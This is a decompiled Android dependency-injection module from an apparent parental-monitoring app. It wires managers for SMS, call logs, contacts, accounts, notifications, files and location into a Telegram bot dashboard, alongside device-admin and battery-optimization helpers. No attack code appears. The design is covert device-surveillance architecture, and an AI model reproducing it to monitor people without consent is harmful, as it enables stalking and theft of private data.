package com.example.di;

import android.content.Context;
import androidx.room.Room;
import com.example.data.local.AppDatabase;
import com.example.data.remote.TelegramBotClient;
import com.example.data.remote.TelegramDashboardManager;
import com.example.data.repository.SettingsRepository;
import com.example.managers.AccountsManager;
import com.example.managers.AppUsageManager;
import com.example.managers.CallLogManager;
import com.example.managers.ContactsExportManager;
import com.example.managers.DeviceLocationManager;
import com.example.managers.DeviceRingManager;
import com.example.managers.FileExplorerManager;
import com.example.managers.NotificationExportManager;
import com.example.managers.OEMCompatibilityManager;
import com.example.managers.SMSReportManager;
import com.example.managers.StudyModeManager;
import com.example.security.ParentSecurityManager;
import com.example.utils.BatteryOptimizationHelper;
import com.example.utils.DeviceAdminManager;
import com.example.utils.NotificationPermissionHelper;
import dagger.Module;
import dagger.Provides;
import javax.inject.Singleton;
import kotlin.Metadata;
import kotlin.jvm.internal.Intrinsics;

/* JADX INFO: compiled from: AppModule.kt */
/* JADX INFO: loaded from: classes3.dex */
@Metadata(d1 = {"\u0000\u0088\u0001\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u000f\u0012\u0006\u0010\u0002\u001a\u00020\u0003¢\u0006\u0004\b\u0004\u0010\u0005J\b\u0010\u0006\u001a\u00020\u0003H\u0007J\u0010\u0010\u0007\u001a\u00020\b2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010\t\u001a\u00020\n2\u0006\u0010\u000b\u001a\u00020\bH\u0007Jh\u0010\f\u001a\u00020\r2\u0006\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u000e\u001a\u00020\n2\u0006\u0010\u000f\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\u00122\u0006\u0010\u0013\u001a\u00020\u00142\u0006\u0010\u0015\u001a\u00020\u00162\u0006\u0010\u0017\u001a\u00020\u00182\u0006\u0010\u0019\u001a\u00020\u001a2\u0006\u0010\u001b\u001a\u00020\u001c2\u0006\u0010\u001d\u001a\u00020\u001e2\u0006\u0010\u001f\u001a\u00020 2\u0006\u0010!\u001a\u00020\"H\u0007J\u0010\u0010#\u001a\u00020$2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010%\u001a\u00020&2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010'\u001a\u00020(2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010)\u001a\u00020*2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010+\u001a\u00020,2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007J\u0010\u0010-\u001a\u00020.2\u0006\u0010\u0002\u001a\u00020\u0003H\u0007R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004¢\u0006\u0002\n\u0000¨\u0006/"}, d2 = {"Lcom/example/di/AppModule;", "", "context", "Landroid/content/Context;", "<init>", "(Landroid/content/Context;)V", "provideContext", "provideSettingsRepository", "Lcom/example/data/repository/SettingsRepository;", "provideTelegramBotClient", "Lcom/example/data/remote/TelegramBotClient;", "settingsRepository", "provideTelegramDashboardManager", "Lcom/example/data/remote/TelegramDashboardManager;", "client", "smsManager", "Lcom/example/managers/SMSReportManager;", "callManager", "Lcom/example/managers/CallLogManager;", "contactsManager", "Lcom/example/managers/ContactsExportManager;", "appUsageManager", "Lcom/example/managers/AppUsageManager;", "accountsManager", "Lcom/example/managers/AccountsManager;", "deviceRingManager", "Lcom/example/managers/DeviceRingManager;", "studyModeManager", "Lcom/example/managers/StudyModeManager;", "notificationExportManager", "Lcom/example/managers/NotificationExportManager;", "fileExplorerManager", "Lcom/example/managers/FileExplorerManager;", "deviceLocationManager", "Lcom/example/managers/DeviceLocationManager;", "provideAppDatabase", "Lcom/example/data/local/AppDatabase;", "provideDeviceAdminManager", "Lcom/example/utils/DeviceAdminManager;", "provideParentSecurityManager", "Lcom/example/security/ParentSecurityManager;", "provideNotificationPermissionHelper", "Lcom/example/utils/NotificationPermissionHelper;", "provideOEMCompatibilityManager", "Lcom/example/managers/OEMCompatibilityManager;", "provideBatteryOptimizationHelper", "Lcom/example/utils/BatteryOptimizationHelper;", "app"}, k = 1, mv = {2, 2, 0}, xi = 48)
@Module
public final class AppModule {
    public static final int $stable = 8;
    private final Context context;

    public AppModule(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        this.context = context;
    }

    @Provides
    @Singleton
    /* JADX INFO: renamed from: provideContext, reason: from getter */
    public final Context getContext() {
        return this.context;
    }

    @Provides
    @Singleton
    public final SettingsRepository provideSettingsRepository(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new SettingsRepository(context);
    }

    @Provides
    @Singleton
    public final TelegramBotClient provideTelegramBotClient(SettingsRepository settingsRepository) {
        Intrinsics.checkNotNullParameter(settingsRepository, "settingsRepository");
        return new TelegramBotClient(settingsRepository);
    }

    @Provides
    @Singleton
    public final TelegramDashboardManager provideTelegramDashboardManager(Context context, TelegramBotClient client, SMSReportManager smsManager, CallLogManager callManager, ContactsExportManager contactsManager, AppUsageManager appUsageManager, AccountsManager accountsManager, DeviceRingManager deviceRingManager, StudyModeManager studyModeManager, NotificationExportManager notificationExportManager, FileExplorerManager fileExplorerManager, DeviceLocationManager deviceLocationManager) {
        Intrinsics.checkNotNullParameter(context, "context");
        Intrinsics.checkNotNullParameter(client, "client");
        Intrinsics.checkNotNullParameter(smsManager, "smsManager");
        Intrinsics.checkNotNullParameter(callManager, "callManager");
        Intrinsics.checkNotNullParameter(contactsManager, "contactsManager");
        Intrinsics.checkNotNullParameter(appUsageManager, "appUsageManager");
        Intrinsics.checkNotNullParameter(accountsManager, "accountsManager");
        Intrinsics.checkNotNullParameter(deviceRingManager, "deviceRingManager");
        Intrinsics.checkNotNullParameter(studyModeManager, "studyModeManager");
        Intrinsics.checkNotNullParameter(notificationExportManager, "notificationExportManager");
        Intrinsics.checkNotNullParameter(fileExplorerManager, "fileExplorerManager");
        Intrinsics.checkNotNullParameter(deviceLocationManager, "deviceLocationManager");
        return new TelegramDashboardManager(context, client, smsManager, callManager, contactsManager, appUsageManager, accountsManager, deviceRingManager, studyModeManager, notificationExportManager, fileExplorerManager, deviceLocationManager);
    }

    @Provides
    @Singleton
    public final AppDatabase provideAppDatabase(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return (AppDatabase) Room.databaseBuilder(context, AppDatabase.class, "parental_db").fallbackToDestructiveMigration().build();
    }

    @Provides
    @Singleton
    public final DeviceAdminManager provideDeviceAdminManager(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new DeviceAdminManager(context);
    }

    @Provides
    @Singleton
    public final ParentSecurityManager provideParentSecurityManager(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new ParentSecurityManager(context);
    }

    @Provides
    @Singleton
    public final NotificationPermissionHelper provideNotificationPermissionHelper(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new NotificationPermissionHelper(context);
    }

    @Provides
    @Singleton
    public final OEMCompatibilityManager provideOEMCompatibilityManager(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new OEMCompatibilityManager(context);
    }

    @Provides
    @Singleton
    public final BatteryOptimizationHelper provideBatteryOptimizationHelper(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        return new BatteryOptimizationHelper(context);
    }
}
